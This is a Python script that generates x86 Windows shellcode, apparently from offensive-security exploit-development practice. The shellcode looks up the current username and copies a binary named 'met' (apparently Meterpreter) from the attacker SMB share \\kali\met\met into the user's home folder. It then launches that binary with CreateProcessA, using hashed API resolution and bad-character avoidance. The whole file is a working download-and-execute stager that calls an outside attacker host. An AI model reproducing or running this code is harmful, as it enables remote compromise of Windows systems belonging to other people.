from coder import call_exit_func, find_and_call
from coder.util import (
    convert_ip_addr_bytes,
    convert_port_hex,
    find_hash_key,
    push_hash,
    push_string,
)


def generate(bad_chars, exit_func, debug=False):
    hash_key = find_hash_key(
        [
            ("ADVAPI32.DLL", "GetUserNameA"),
            ("KERNEL32.DLL", "CopyFileExA"),
            ("KERNEL32.DLL", "CreateProcessA"),
        ]
        + ([exit_func] if exit_func else []),
        bad_chars,
    )

    source_file = "\\\\kali\\met\\met"
    dest_base = "C:\\Users\\"
    sep = "\\"
    dest_filename = "met.exe"
    dest_file = "C:\\Users\\alysh\\met.exe"
    test_file = "C:\\Users\\alysh\\"
    #dest_file = "C:\\Windows\\System32\\calc.exe"
    #dest_file = "/c calc"
    #cmd = "cmd"
    
    print(bad_chars)
    return f"""
    start:
        {'int3' if debug else ''}       // Breakpoint for Windbg
        mov   ebp, esp
        add   esp, 0xfffff9f0           // Avoid NULL bytes

    {find_and_call.generate(hash_key)}

    get_username:                       // BOOL GetUserNameA([out] LPSTR   lpBuffer, [in, out] LPDWORD pcbBuffer);
        sub esp, 0x10                   // buffer allocation on stack
        xor eax, eax                    // Zeroify eax
        mov eax, esp                    // Initialization of pcbBuffer
        mov edx, 0x10                   // On prepare la valeur 0x10
        mov [eax], edx                  // On met la valeur 0x10 dans l'adresse pointé par eax
                                        //
        xor ecx, ecx                    // Zeroify ecx
        sub esp, 0x10                   // BufferAllocation to contain Desktop path
        mov ecx, esp                    // put @lpBuffer in eax
        mov esi, ecx                    // We save @lpBuffer for later uses
        push eax                        // pcbBuffer (arg2)
        push ecx                        // lpBuffer (arg1)
        {push_hash('ADVAPI32.DLL', 'GetUserNameA', hash_key)}
        call dword ptr [ebp+0x04]       // Call GetUserNameA


    build_dest_path:
        mov ecx, esi                       // Sauvegarde du buffer username
        sub esp, 0x100                     // Allocation de 256 octets pour le buffer complet
        mov edi, esp                       // Destination buffer
        mov ebx, edi                       // Sauvegarde du buffer destination

        {push_string(dest_base, bad_chars)} // Pousser "C:\\Users\\"
        mov esi, esp                       // Chaîne source dans esi

    .copy_users_prefix:
        lodsb                              // Lire un octet de esi
        test al, al                        // Vérifier si c'est le null terminator
        jz .done_users_prefix              // Si null terminator, fin de copie
        stosb                              // Écrire l'octet dans edi
        jmp .copy_users_prefix             // Répéter
    
    .done_users_prefix:
        mov esi, ecx                       // Charger le buffer username

    .copy_username:
        lodsb                              // Lire un octet de esi
        test al, al                        // Vérifier si c'est le null terminator
        jz .done_username                  // Si null terminator, fin de copie
        stosb                              // Écrire l'octet dans edi
        jmp .copy_username                 // Répéter
    
    .done_username:
        {push_string(sep, bad_chars)}
        mov esi, esp                       // Chaîne source dans esi
    
    .copy_separator:
        lodsb                              // Lire un octet de esi
        test al, al                        // Vérifier si c'est le null terminator
        jz .done_separator                    // Si null terminator, fin de copie
        stosb                              // Écrire l'octet dans edi
        jmp .copy_separator                   // Répéter
    
    .done_separator:
        {push_string(dest_filename, bad_chars)} // Pousser "met.exe"
        mov esi, esp                       // Chaîne source dans esi

    .copy_suffix:
        lodsb                              // Lire un octet de esi
        test al, al                        // Vérifier si c'est le null terminator
        jz .done_suffix                    // Si null terminator, fin de copie
        stosb                              // Écrire l'octet dans edi
        jmp .copy_suffix                   // Répéter
    
    .done_suffix:
        xor eax, eax                       // Charger 0 dans eax
        stosb                              // Écrire un octet nul (0x00) à la fin du buffer
        mov edi, ebx                       // Charger le buffer complet pour les prochaines étapes
        
        
    copy_to_home:
        {push_string(source_file, bad_chars)} // push_string
        mov esi, esp                    // retrieve source in esi
        xor eax, eax                    // We put 0 in eax
        push eax                        // dwCopyFlags (arg6)
        push eax                        // pbCancel (arg5)
        push eax                        // lpData (arg4)
        push eax                        // lpProgressRouting (arg3)
        push edi
        push esi
        {push_hash('KERNEL32.DLL', 'CopyFileExA', hash_key)}
        call dword ptr [ebp+0x04]       // Call CopyFileExA
        
        
    prepare_loop:
        xor ecx, ecx                    // zero out counter register
        mov cl, 0xff                    // we'll loop 255 times (0xff)
        xor edi, edi                    // edi now 0x00000000

    zero_loop:
        push edi                        // place 0x00000000 on stack 255 times as a way to 'zero memory' 
        loop zero_loop

        
    exec_binary:
        push 0x636c6163 // calc
        mov edx, esp
        
        xor eax, eax                    // zero out
        push edx                        // lpProcessInfo pointing to dummy as a struct argument (arg10)
        push edx                        // lpStartupInfo pointing to dummy as a struct argument (arg9)
        push eax                        // lpCurrentDirectory (arg8)
        push eax                        // lpEnvironment (arg7)
        push eax                        // dwCreationFlags (arg6)
        push eax                        // bInheritHandles (arg5)
        push eax                        // lpThreadAttributes (arg4)
        push eax                        // lpProcessAttributes (arg3)
        push ebx                        // lpCommandLine (arg2)
        push eax                        // lpApplicationName (arg1)
        {push_hash("KERNEL32.DLL", 'CreateProcessA', hash_key)}
        call dword ptr [ebp+0x04]       // Call CreateProcessA
        
        
    {call_exit_func.generate(exit_func, hash_key)}
    """
